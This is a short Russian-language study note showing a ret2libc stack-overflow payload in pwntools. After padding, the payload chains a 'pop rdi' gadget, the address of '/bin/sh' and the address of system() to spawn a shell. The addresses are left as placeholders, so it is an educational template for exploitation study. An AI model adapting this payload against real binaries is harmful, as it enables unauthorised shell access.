
> [!example] 
> Пусть мы знаем адрес `SYSTEM`, адрес строки `/bin/sh`, базу `libc`, а также нашли `gadget`.

```python
from pwn import *

binsh = 0xNNNNN
libcbase = 0xNNNNN
sys = 0xNNNNN
poprdi = 0xNNNNNN

payload = cyclic(M) # M - overflow stack + rbp
payload += p64(poprdi)
payload += p64(libcbase + binsh)
payload += p64(libcbase + sys)

```

